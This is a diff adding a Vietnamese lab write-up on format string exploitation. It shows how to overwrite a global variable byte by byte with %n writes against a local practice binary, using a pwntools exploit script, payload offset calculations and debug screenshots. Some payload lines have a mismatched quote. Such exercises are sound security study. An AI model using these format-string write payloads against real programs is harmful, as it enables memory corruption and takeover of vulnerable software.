@@ -162,6 +162,92 @@ for_a()
 
 
 ## Câu 6
+- Ở bài này, ta muốn overwrite `b = 0x12345678`, tuy nhiên đây là 1 con số rất lớn nên ta khổng thể khai thác như 2 bài trước. Thay vào đó ta sẽ khai thác bằng cách overwrite từng byte.
+- Giả sử địa chỉ của `b` là `b_addr`. Ta sẽ overwrite byte tại `b_addr` thành `0x78`, sau đó overwrite byte tại `b_addr + 1` thành `0x56`, v.v.
+
+### Overwrite `b_addr` với 0x78
+- Đầu tiên, `0x78` tương đương 120 ở decimal và vị trí của payload trên stack sẽ là đối số thứ 6 trong format string (tương tự các câu  trên). Do đó ta sẽ có payload ban đầu là `%120x%6$n`.
+- Sau đó, ta thêm `b_addr` vào đầu payload thì payload sẽ có thêm 4 byte được đọc trước `%n` nên ta sẽ giảm offset từ 120 xuống 116.
+- Script exploit:
+```python
+from pwn import *
+
+
+def for_b():
+    sh = process('./overwrite')
+    e = ELF('./overwrite')
+    b_addr = e.symbols['b']
+    print(hex(b_addr))
+    
+    payload = p32(b_addr) + b'%116x%6$n'
+    print(payload)
+
+    with open('payload.in', 'wb') as f:
+        f.write(payload)
+
+    sh.sendline(payload)
+    print(sh.recv())
+    sh.interactive()
+
+for_b()
+```
+- Đặt breakpoint ngay sau câu lệnh `printf` thứ 2 và debug để kiểm tra kết quả:  
+
+![image](https://user-images.githubusercontent.com/44528004/143361017-6c062722-fd05-4b09-aff0-dedde7add33a.png)
+
+
+### Overwrite `b_addr + 1` với 0x56
+- Tiếp theo ta chèn thêm địa chỉ `b_addr + 1` vào payload ở ngày sau `b_addr`. Lúc này sẽ có thêm 4 byte phía trước `%n` đầu tiên nên ta sẽ giảm offset từ 116 xuống 112.
+- Để tính offset để ghi đè `b_addr + 1`, ta sẽ thử `%10x%7$n`. Ở đây vì `%6$n` sẽ ghi vào đối số thứ 6 là `b_addr`, nhưng `b_addr + 1` nằm cách đầu payload 4 byte nên `b_addr + 1` sẽ trở thành đối số thứ 7.
+```python
+payload = p32(b_addr) + p32(b_addr + 1)
+payload += b'%112x%6$n` + b'%10x%7$n'
+```
+
+- Debug để kiểm tra giá trị của `b`:  
+
+![image](https://user-images.githubusercontent.com/44528004/143360719-9e0df225-17f7-47ff-9459-14ba9c60f347.png)
+
+- Nếu ta tăng offset lên `%30x%7$n` thì kết quả chạy là:  
+
+![image](https://user-images.githubusercontent.com/44528004/143364155-b9e78349-a7b6-4732-8ba7-6ee149e9d57c.png)
+
+- Ta quan sát thấy được `0x96 - 0x82 = 0x14 = 20` byte, bằng với khoảng cách của offset mà ta vừa thay đổi (từ 10 lên 30).
+- Vì ta muốn ghi đè với giá trị là `0x56`, mà hiện tại `b_addr + 1` được ghi vào với giá trị `0x82`. Bên cạnh đó, ta không thể giảm số byte đã đọc nên ta chỉ có thể tăng số byte đọc lên `0x156` byte.
+- Ta tính offset bằng cách lấy `0x156 - 0x82 + 0x10 = 0xe4 = 228` byte. Lúc này payload của ta là:  
+
+```python
+payload = p32(b_addr) + p32(b_addr + 1)
+payload += b'%112x%6$n` + b'%228x%7$n'
+```
+
+- Kết quả debug:  
+
+![image](https://user-images.githubusercontent.com/44528004/143364761-ee13fef1-7840-4c5d-ba13-67f3495cbeef.png)
+
+- Lúc này kết quả chạy cho thấy `b_addr + 1` đang có giá trị là `0x5c` mà ta muốn `0x56` nên ta sẽ giảm offset đi 1 lượng tương ứng `0x5c - 0x56 = 6`. Vậy offset sẽ thành 222 byte.
+- Payload:  
+```python
+payload = p32(b_addr) + p32(b_addr + 1)
+payload += b'%112x%6$n` + b'%222x%7$n'
+```
+- Kết quả debug:  
+
+![image](https://user-images.githubusercontent.com/44528004/143364931-298eb23b-a3fc-4a6f-88f5-331822f1d37d.png)
+
+### Overwrite `b_addr + 2` và `b_addr + 3`
+- Với cách khai thác tương tự như khai thác `b_addr + 1`, ta có payload sau:  
+```python
+payload = p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3)
+payload += b'%104x%6$n' + b'%222x%7$n' + b'%222x%8$n' + b'%222x%9$n'
+```
+
+- Debug để xem giá trị của `b`:  
+
+![image](https://user-images.githubusercontent.com/44528004/143365076-655a32d4-5f82-4699-a964-8571b45c06f4.png)  
+> Đúng giá trị ta mong muốn.
+
+- Script hoàn chỉnh như sau:
 ```python
 from pwn import *
 
@@ -186,3 +272,9 @@ def for_b():
 
 for_b()
 ```
+
+
+- Kết quả chạy script:  
+
+![image](https://user-images.githubusercontent.com/44528004/143365221-05dc1df7-e346-4b4c-ade2-f1558784b345.png)
+> Thành công, chương trình đã in ra `modified b for a big number!\n`.
